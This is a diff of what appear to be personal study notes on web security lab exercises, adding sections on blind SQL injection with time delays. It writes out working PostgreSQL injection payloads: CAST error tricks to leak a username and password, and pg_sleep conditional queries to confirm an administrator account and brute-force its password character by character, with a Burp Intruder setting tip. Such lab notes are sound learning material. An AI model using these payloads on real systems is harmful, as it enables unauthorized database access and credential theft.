@@ -240,6 +240,20 @@ Same injection point in the cookie
 - then we send this: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` and we get an error about casting administrator as an int
 - then we can do the same to pull out the password: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
-### 
+### Blind SQL injection with time delays
 
+Place a sleep call into your injection
+`'||pg_sleep(10)--`
+
+### Blind SQL injection with time delays and information retrieval
+
+now we add a condition to trigger the sleep 
+- `';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`, verify 10 seconds happen
+- `';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`, now verify it doesn't trigger, now we have our conditional syntax created
+- `';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` pull if there is an administrator user in the users table
+- `';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` get length of password for administrator, increase the 1 incrementally until you get a sleep
+- `';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` now we will do the brute force on password value here
+- for the above to work in intruder, go to Resource pool tab and change maximum concurrent requests to 1
+
+### Blind SQL injection with out-of-band interaction
 
